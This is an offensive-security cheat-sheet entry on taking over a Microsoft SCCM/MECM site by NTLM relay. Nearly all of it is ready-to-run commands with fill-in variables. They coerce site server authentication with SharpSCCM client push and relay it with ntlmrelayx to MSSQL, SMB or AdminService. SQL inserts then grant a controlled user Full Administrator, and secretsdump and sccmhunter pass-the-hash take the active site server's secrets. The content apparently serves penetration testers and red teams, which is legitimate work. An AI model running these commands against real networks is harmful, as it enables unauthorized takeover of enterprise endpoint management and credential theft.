---
technique: SCCMSiteTakeover
category: sccm-mecm
targets: Site Server, Site Database, SMS Provider
protocols: NTLM, MSSQL, SMB, HTTPS
remote_capable: true
tags: sccm mecm site-takeover ntlm-relay mssql adminservice ad
---

# SCCMSiteTakeover

SCCM site takeover relays site server or passive site server machine account authentication to privileged SCCM infrastructure. Successful relay can grant database access, AdminService access, or local administrator access on site systems, leading to Full Administrator rights in SCCM.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Coercible site server | Site server or passive site server authentication must be forced or captured |
| Relay target | MSSQL, SMB, or AdminService must accept the relayed authentication path |
| Site identifiers | Database paths require the three-character site code and target user's SID |

## Windows

### SharpSCCM user SID

#powershell #sharpsccm #sid

Retrieve the current user's SID before granting SCCM RBAC rights.

```powershell title:"Retrieve current user SID with SharpSCCM"
.\SharpSCCM.exe get user-sid
```
<!-- cheat -->

### SharpSCCM client push coercion

#powershell #sharpsccm #coercion

Coerce site server authentication toward the relay host through client push installation.

```powershell title:"Coerce SCCM site server authentication with client push"
.\SharpSCCM.exe invoke client-push -mp "$mp_fqdn" -sc "$site_code" -t "$relay_host"
```
<!-- cheat
var mp_fqdn
var site_code
var relay_host
-->

### SharpSCCM verify full admin

#powershell #sharpsccm #verify

Verify SCCM site push settings after granting the controlled user administrative rights.

```powershell title:"Verify SCCM admin rights with SharpSCCM"
.\SharpSCCM.exe get site-push-settings -mp "$mp_fqdn" -sc "$site_code"
```
<!-- cheat
var mp_fqdn
var site_code
-->

## Linux

### rpcclient lookup SID

#smb #rpcclient #sid

Resolve a controlled username to its SID from a domain target.

```sh title:"Lookup controlled user SID with rpcclient"
rpcclient -c "lookupnames $user" "$target_ip"
```
<!-- cheat
import users
var target_ip
-->

### lookupsid

#python #impacket #sid

Resolve domain SIDs with Impacket lookupsid.

```sh title:"Lookup domain SID with Impacket"
lookupsid.py "$domain/$user:$pass@$target"
```
<!-- cheat
import domain_ip
import users
import passwords
var target
-->

### ntlmrelayx MSSQL site database

#python #impacket #relay #mssql

Relay site server authentication to the SCCM site database MSSQL service.

```sh title:"Relay SCCM site server auth to MSSQL"
ntlmrelayx.py -t "mssql://$site_database_fqdn" -smb2support -socks
```
<!-- cheat
var site_database_fqdn
-->

### ntlmrelayx SMB site database

#python #impacket #relay #smb

Relay site server authentication to SMB on the SCCM site database server.

```sh title:"Relay SCCM site server auth to SMB"
ntlmrelayx.py -t "$site_database_fqdn" -smb2support -socks
```
<!-- cheat
var site_database_fqdn
-->

### mssqlclient through relay socks

#python #impacket #mssql

Open an MSSQL console through the relay SOCKS session as the site server machine account.

```sh title:"Open SCCM site database through relay SOCKS"
proxychains mssqlclient.py "$domain/$site_server_machine@$site_database_fqdn" -windows-auth
```
<!-- cheat
import domain_ip
var site_server_machine
var site_database_fqdn
-->

### SQL use site database

#sql #mssql #rbac

Switch to the SCCM site database before modifying RBAC tables.

```sql title:"Switch to SCCM site database"
use CM_$site_code
```
<!-- cheat
var site_code
-->

### SQL add RBAC admin

#sql #mssql #rbac

Add the controlled user SID to SCCM RBAC administrators.

```sql title:"Insert controlled user into RBAC_Admins"
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ($sid_hex,'$domain\$user',0,0,'','','','','$site_code')
```
<!-- cheat
import domain_ip
import users
var sid_hex
var site_code
-->

### SQL retrieve AdminID

#sql #mssql #rbac

Retrieve the newly created AdminID for RBAC permission grants.

```sql title:"Retrieve SCCM RBAC AdminID"
SELECT AdminID,LogonName FROM RBAC_Admins
```
<!-- cheat -->

### SQL grant all objects scope

#sql #mssql #rbac

Grant Full Administrator rights over the All Objects scope.

```sql title:"Grant SCCM Full Admin over all objects"
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ($admin_id,'SMS0001R','SMS00ALL','29')
```
<!-- cheat
var admin_id
-->

### SQL grant all systems scope

#sql #mssql #rbac

Grant Full Administrator rights over the All Systems scope.

```sql title:"Grant SCCM Full Admin over all systems"
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ($admin_id,'SMS0001R','SMS00001','1')
```
<!-- cheat
var admin_id
-->

### SQL grant all users scope

#sql #mssql #rbac

Grant Full Administrator rights over the All Users and User Groups scope.

```sql title:"Grant SCCM Full Admin over all users"
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ($admin_id,'SMS0001R','SMS00004','1')
```
<!-- cheat
var admin_id
-->

### ntlmrelayx AdminService takeover

#python #impacket #relay #adminservice

Relay site server authentication to the SCCM AdminService API and grant the controlled user SCCM admin rights.

```sh title:"Relay SCCM site server auth to AdminService"
ntlmrelayx.py -t "https://$sms_provider_fqdn/AdminService/wmi/SMS_Admin" -smb2support --adminservice --logonname "$domain\\$user" --displayname "$domain\\$user" --objectsid "$sid"
```
<!-- cheat
import domain_ip
import users
var sms_provider_fqdn
var sid
-->

### ntlmrelayx passive to active SMB

#python #impacket #relay #smb

Relay passive site server authentication to SMB on the active site server.

```sh title:"Relay passive SCCM site server auth to active server SMB"
ntlmrelayx.py -t "$active_server_fqdn" -smb2support -socks
```
<!-- cheat
var active_server_fqdn
-->

### secretsdump active site server

#python #impacket #smb

Dump active site server secrets through the relay SOCKS session.

```sh title:"Dump active SCCM site server secrets through relay SOCKS"
proxychains4 secretsdump.py "$domain/$passive_server_machine@$active_server_fqdn"
```
<!-- cheat
import domain_ip
var passive_server_machine
var active_server_fqdn
-->

### sccmhunter add admin with site server hash

#python #sccmhunter #adminservice

Open an AdminService shell as the active site server machine account using its recovered hash.

```sh title:"Open SCCM AdminService as site server machine"
python3 sccmhunter.py admin -u "$active_server_machine" -p "$lm_hash:$nt_hash" -ip "$sms_provider_ip"
```
<!-- cheat
var active_server_machine
var lm_hash
var nt_hash
var sms_provider_ip
-->
